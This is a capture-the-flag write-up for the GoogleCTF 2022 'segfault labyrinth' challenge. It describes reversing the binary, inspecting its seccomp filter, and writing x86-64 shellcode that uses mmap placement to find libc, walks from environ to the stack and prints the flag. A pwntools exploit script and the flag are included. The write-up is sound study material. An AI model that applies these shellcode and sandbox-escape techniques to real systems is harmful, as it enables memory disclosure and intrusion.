# GoogleCTF 2022 - segfault labyrinth

# Challenge Description

```
Be careful! One wrong turn and the whole thing comes crashing down

nc segfault-labyrinth.2022.ctfcompetition.com 1337

Solves: (189 pt/ 56 solves)
```

The challenge code can be found here: [https://github.com/google/google-ctf/tree/master/2022/misc-segfault-labyrinth](https://github.com/google/google-ctf/tree/master/2022/misc-segfault-labyrinth)

# Inspection

I first put the challenge binary into ghidra and start reversing. We can see that the challenge binary reads the size of the input, read the shellcode, and then execute the shellcode.

![Reading shellcode](/img/GoogleCTF2022-segfault-labyrinth-read.png)

We also know that there are some seccomp rule implemented, so we dump it through `seccomp-tools`

![Seccomp tools output](/img/GoogleCTF2022-segfault-labyrinth-seccomp.png)

That’s quite a specific list of syscall allowed. We know that the flag is read into the memory already, so we just need to find the location and then write it. From the code below we know that there is still a reference to the flag string on the stack, since the flag pointer is never overwritten again.

![Reversing to find flag on stack](/img/GoogleCTF2022-segfault-labyrinth-rev-flag.png)

# Checking environment

To start the exploit, I decide to checkout what state we have to work with when the code start executing our code. By sending “\xcc” as our shellcode, we can trap the process at the start of the shellcode. 

![Shellcode execute environment](/img/GoogleCTF2022-segfault-labyrinth-env.png)

It seems like there wasn’t much to work with, only rdi is left, which doesn’t seems to point to anything useful. I start searching for ways to obtain a stack address, since then we can use a offset to the flag point and read the flag. Reading the blog post [https://nickgregory.me/post/2019/04/06/pivoting-around-memory/](https://nickgregory.me/post/2019/04/06/pivoting-around-memory/), I know that if I leaked the libc base address, I can leverage the environment pointer to get to the stack. After that I’ll just need to find the offset from the environment to the flag to write it out.

# Syscall - mmap

So now, how do I get a libc address without any reference? Maybe somehow the syscall allowed can provide some useful information. From doing heap exploitation before, I know there is a common trick to leak libc address by mallocing a large chunk, which make libc use mmap to allocate the chunk ([https://github.com/bennofs/docs/blob/master/hxp-2017/impossible.md](https://github.com/bennofs/docs/blob/master/hxp-2017/impossible.md)). 

If we call mmap with a null pointer as address, the kernel will decide where the new chunk should be placed at. Apparently the kernel tend to allocate chunks next to each other, though this is not guaranteed in the manual. From my understanding, since libc is mmaped by the loader, if we mmaped another large chunk again, the kernel will put it next to libc, so the offset to libc is fixed.

![mmap manual](/img/GoogleCTF2022-segfault-labyrinth-mmap.png)

When testing this behavior, I notice that it worked if the chunk is large enough that it doesn’t fit into the gap between loader and libc. So I mmaped a 0x100000 size chuck to get libc, then used that to get libc environment point. After that it’s smooth sailing to print out the flag. The final shellcode is shown below. See appendix for the full exploit code.

```markdown
// mmap large chunk to get libc
mov rax, 9
mov rdi, 0
mov rsi, 0x100000
mov rdx, 0x7
mov r10, 0x22
mov r8,  -1
mov r9,  0
syscall

//get stack from libc environ
add rax, 0x2ef600
mov rsp, [rax]

//print flag
mov rax, 1
mov rdi, 1
mov rdx, 0x100
mov rsi, [rsp-0x240]
syscall
```

P.S. While I am writing this write up, I notice that this wasn’t 100% consistent in the remote environment. It worked around 1/2 of the time, so just run it a few times if it doesn’t work.

![executing the exploit](/img/GoogleCTF2022-segfault-labyrinth-exec.png)

Flag: `CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}` 

# Appendix - exp.py

{% capture exp_py %}
```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
gdb_script = '''
'''

file_name = './challenge'
p = process(file_name)
elf = ELF(file_name)
context.binary = file_name
#libc = ELF('')
nc_str = 'nc segfault-labyrinth.2022.ctfcompetition.com 1337'
HOST = nc_str.split(' ')[1]
PORT = nc_str.split(' ')[2]
p = remote(HOST, PORT)

#gdb.attach(p, gdb_script)

shellcode = '''
// mmap large chunk to get libc
mov rax, 9
mov rdi, 0
mov rsi, 0x100000
mov rdx, 0x7
mov r10, 0x22
mov r8,  -1
mov r9,  0
syscall

//get stack from libc environ
add rax, 0x2ef600
mov rbx, [rax]

//print flag
mov rax, 1
mov rdi, 1
mov rdx, 0x100
mov rsi, [rbx-0x240]
syscall
'''

shellcode = asm(shellcode)
p.send(p64(len(shellcode)))
p.send(shellcode)

p.interactive()
```

{% endcapture %}

{% include widgets/toggle-field.html toggle-name="exp_py"
    button-text="Show exp.py" toggle-text=exp_py%}


